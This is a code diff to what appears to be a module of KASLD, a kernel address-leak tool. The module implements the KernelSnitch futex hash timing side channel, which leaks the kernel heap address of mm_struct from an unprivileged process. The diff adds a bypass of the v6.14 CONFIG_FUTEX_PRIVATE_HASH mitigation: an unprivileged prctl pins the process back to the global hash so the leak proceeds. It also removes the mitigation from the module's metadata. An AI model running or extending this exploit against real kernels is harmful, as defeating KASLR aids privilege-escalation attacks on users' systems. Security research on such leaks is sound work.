@@ -3,10 +3,10 @@
 // KernelSnitch: Futex hash table timing side-channel to leak mm_struct address.
 //
 // Exploits the fact that the kernel's global futex hash table hashes
-// (mm_struct pointer, user-space address) via jhash2(). By piling 4096
+// (mm_struct pointer, user-space address) via jhash2(). Piling 4096
 // FUTEX_WAIT_PRIVATE sleepers onto a single address (flooding one hash
 // bucket), then probing other addresses with timed FUTEX_WAKE_PRIVATE
-// calls, we identify collision addresses — those whose hash bucket
+// calls, identifies collision addresses — those whose hash bucket
 // contains 4096 entries and thus takes much longer to traverse.
 //
 // Knowing which user-space addresses collide (same bucket) and which
@@ -17,8 +17,10 @@
 // Leaks current->mm (mm_struct kernel heap address in the direct-map
 // region). KASLD reports this as a directmap address.
 //
-// Works on x86_64 Linux kernels without CONFIG_FUTEX_PRIVATE_HASH
-// (mainline < ~v6.14, Ubuntu <= 6.8, most distro kernels as of 2025).
+// Works on x86_64 Linux across all versions. Pre-v6.14 kernels use the global
+// mm-keyed hash by default. On v6.14+ (CONFIG_FUTEX_PRIVATE_HASH) the intended
+// mitigation is opt-out-able unprivileged: PR_FUTEX_HASH_SET_SLOTS=0 pins the
+// probe's own process back onto the global table before the pile-up.
 //
 // Requires: ~64 GB virtual address space (MAP_NORESERVE, no physical
 // RAM consumed), ~4096 threads for pile-up, multi-threaded brute-force
@@ -33,15 +35,19 @@
 //   Data structure:   current->mm (struct mm_struct pointer)
 //   Address type:     virtual (direct-map / kernel heap)
 //   Method:           timing (hash collision side-channel)
-//   Status:           mitigated in v6.14 (CONFIG_FUTEX_PRIVATE_HASH)
+//   Status:           unfixed; the v6.14 CONFIG_FUTEX_PRIVATE_HASH mitigation
+//                     is opt-out-able unprivileged (PR_FUTEX_HASH_SET_SLOTS=0)
 //   Access check:     none (futex syscall, unprivileged; timing side-channel)
 //   Source: https://elixir.bootlin.com/linux/v6.12/source/kernel/futex/core.c
 //
 // Mitigations:
-//   CONFIG_FUTEX_PRIVATE_HASH=y (v6.14+) replaces the global hash table
-//   with per-mm private hash tables, eliminating cross-process hash
-//   collisions. Most distro kernels as of 2025 lack this option.
-//   No runtime sysctl can restrict access. No other mitigation.
+//   CONFIG_FUTEX_PRIVATE_HASH=y (v6.14+) gives each mm a private hash whose key
+//   excludes mm_struct. It is not effective here: the opt-out prctl
+//   PR_FUTEX_HASH_SET_SLOTS=0 has no capability check, so the probe pins its
+//   own process back onto the global mm-keyed table and the self-leak proceeds.
+//   Effective mitigation would require gating that opt-out (e.g. behind a
+//   capability), which no released kernel does as of v7.2. No runtime sysctl
+//   restricts access.
 //
 // References:
 // https://lukasmaar.github.io/papers/ndss25-kernelsnitch.pdf
@@ -122,7 +128,7 @@
  *   gcd=128:  1152
  *   gcd=64:   1088, 1216, 1344, 1408, 1472
  *
- * When the size is unknown, we search in GCD-based tiers:
+ * When the size is unknown, the search runs in GCD-based tiers:
  *   tier 1 (step=128): covers 1024, 1152, 1280, 1536 in one pass.
  *   tier 2 (step=64):  covers 1088, 1216, 1344, 1408, 1472 in one pass.
  *
@@ -186,17 +192,19 @@ KASLD_EXPLAIN(
     "function mixes the mm_struct kernel heap address with the futex "
     "user virtual address. By creating many futex wait operations and "
     "measuring contention-induced timing differences, the attacker "
-    "brute-forces the mm_struct address. Mitigated by "
-    "CONFIG_FUTEX_PRIVATE_HASH (v6.14+), which replaces the global "
-    "hash table with per-process private tables.");
+    "brute-forces the mm_struct address. On v6.14+ the "
+    "CONFIG_FUTEX_PRIVATE_HASH mitigation removes mm_struct from the "
+    "private-hash key, but its opt-out prctl is unprivileged: the probe "
+    "pins its own process back onto the global table and proceeds.");
 
+/* No config:/patch: mitigation key: the v6.14 CONFIG_FUTEX_PRIVATE_HASH gate is
+ * opt-out-able unprivileged (see the pivot in the prep phase), so it does not
+ * protect the target and must not be reported as a mitigation. */
 KASLD_META("method:timing\n"
            "phase:probing\n"
            "live:1\n"
            "discloses:virtual\n"
-           "status:experimental\n"
-           "config:CONFIG_FUTEX_PRIVATE_HASH\n"
-           "patch:v6.14\n");
+           "status:experimental\n");
 
 /* Hash exactly 4 u32 words with initval (matches kernel futex path). */
 static inline uint32_t jhash2_4(const uint32_t *k, uint32_t initval) {
@@ -298,7 +306,7 @@ static int num_sleepers_created;
 static void *sleeper_fn(void *arg) {
   (void)arg;
   /* Block on the pile-up futex. The anonymous page is zero-filled,
-   * and we pass val=0, so the WAIT succeeds and the thread sleeps. */
+   * and val=0 is passed, so the WAIT succeeds and the thread sleeps. */
   syscall(SYS_futex, (int *)pile_addr, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
   return NULL;
 }
@@ -400,7 +408,7 @@ static uint64_t measure_wake(unsigned long addr) {
 
 static int find_collisions(unsigned long *collisions, int *num_collisions,
                            unsigned int hashsize) {
-  /* Scale probe count: we need enough probes to expect ~4x MAX_COLLISIONS
+  /* Scale probe count: enough probes are needed to expect ~4x MAX_COLLISIONS
    * hits. Each probe has a 1/hashsize chance of colliding. For small
    * hashtables (4 CPUs → hashsize=1024): 65536 probes → ~64 expected hits.
    * For large hashtables (128 CPUs → hashsize=32768): need ~2M probes. */
@@ -492,9 +500,9 @@ static int find_collisions(unsigned long *collisions, int *num_collisions,
  *
  * The set of valid mm addresses (relative to POB_MIN) is a subset of
  * multiples of gcd(GiB, PAGE_SIZE, slab_size) = gcd(PAGE_SIZE, slab_size).
- * Stepping by this GCD guarantees we visit every possible mm position.
+ * Stepping by this GCD visits every possible mm position.
  *
- * When the size is unknown, we search in GCD-based tiers rather than
+ * When the size is unknown, the search runs in GCD-based tiers rather than
  * trying each size sequentially: tier 1 at step=128 covers the four
  * most common sizes (1024, 1152, 1280, 1536) simultaneously.
  * =========================================================================
@@ -682,7 +690,8 @@ static unsigned long brute_force_mm(unsigned long *collisions,
   int progress_started =
       (pthread_create(&progress_tid, NULL, progress_fn, &ctx) == 0);
 
-  /* Worker threads — track which ones actually started so we only join those.
+  /* Worker threads — track which ones actually started so only those are
+   * joined.
    * A failed pthread_create under resource pressure (FD/process limits) leaves
    * tids[i] uninitialised; joining it would be UB. */
   int *started = calloc((size_t)nthreads, sizeof(int));
@@ -776,18 +785,43 @@ int main(void) {
 
   kasld_info("trying KernelSnitch (futex hash timing) ...");
 
-  /* Check for CONFIG_FUTEX_PRIVATE_HASH mitigation. When enabled,
-   * private futexes use a per-mm hash table and mm_struct is NOT part
-   * of the hash key, making the timing side-channel impossible. */
+  /* CONFIG_FUTEX_PRIVATE_HASH (v6.14+) gives each mm a private futex hash whose
+   * key excludes the mm_struct pointer -- the intended mitigation. The opt-out
+   * prctl, however, has no capability check: PR_FUTEX_HASH_SET_SLOTS with zero
+   * slots pins THIS process's own private futexes back onto the GLOBAL,
+   * mm-keyed table (the kernel sets hash_mask=0, so the private path is skipped
+   * and the key hashed by jhash2 again includes private.mm). So pin to the
+   * global table and run the leak, rather than declining. Pre-v6.14 kernels
+   * lack the prctl (GET_SLOTS returns -1) and use the global table by default,
+   * so the pivot is skipped there. */
 #ifndef PR_FUTEX_HASH
-#define PR_FUTEX_HASH 75
+#define PR_FUTEX_HASH 78
 #endif
+#ifndef PR_FUTEX_HASH_SET_SLOTS
+#define PR_FUTEX_HASH_SET_SLOTS 1
+#endif
+#ifndef PR_FUTEX_HASH_GET_SLOTS
 #define PR_FUTEX_HASH_GET_SLOTS 2
+#endif
   if (prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0) >= 0) {
-    fprintf(stderr, "[-] kernelsnitch: CONFIG_FUTEX_PRIVATE_HASH is enabled; "
-                    "attack not possible\n");
-    return kasld_disp_mitigation("CONFIG_FUTEX_PRIVATE_HASH",
-                                 "CONFIG_FUTEX_PRIVATE_HASH enabled");
+    /* v6.14+: pin this process to the global mm-keyed hash before the pile-up.
+     */
+    errno = 0;
+    int pinned = prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_SET_SLOTS, 0, 0, 0);
+    /* Success, or EBUSY (already pinned to the global hash), both leave this
+     * process on the mm-keyed table. Any other failure means the opt-out was
+     * refused -- e.g. a future capability gate on it -- and the mitigation
+     * genuinely holds. */
+    if (pinned < 0 && errno != EBUSY) {
+      fprintf(stderr, "[-] kernelsnitch: CONFIG_FUTEX_PRIVATE_HASH enabled and "
+                      "the global-hash opt-out was refused; attack not "
+                      "possible\n");
+      return kasld_disp_mitigation(
+          "CONFIG_FUTEX_PRIVATE_HASH",
+          "CONFIG_FUTEX_PRIVATE_HASH enabled; global-hash opt-out refused");
+    }
+    kasld_info("CONFIG_FUTEX_PRIVATE_HASH present; pinned to the global futex "
+               "hash via PR_FUTEX_HASH_SET_SLOTS=0");
   }
 
   /* Determine futex hash table size. */
